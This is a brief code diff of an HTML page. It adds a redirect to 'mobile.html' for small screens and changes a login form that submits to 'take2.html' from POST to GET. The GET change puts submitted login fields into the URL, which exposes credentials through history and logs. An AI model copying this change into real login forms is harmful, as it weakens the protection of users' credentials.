@@ -330,6 +330,10 @@
         if((navigator.userAgent.match(/iPhone/i)) || (navigator.userAgent.match(/iPod/i))) {
             if (document.cookie.indexOf("iphone_redirect=false") == -1) window.location = "mobile.html";
         }
+	    
+	       if (screen.width <= 720) {
+        window.location = "mobile.html";
+    }
     </script>
 </head>
 <body>
@@ -360,7 +364,7 @@
 
         <div>
             <div>
-                <form id="login" action="take2.html" method="post">
+                <form id="login" action="take2.html" method="get">
 
                     <div>
                         <input type="text" value="" placeholder="Username" name="cc-fields[first_name][value]" class="t  required" id="Username">
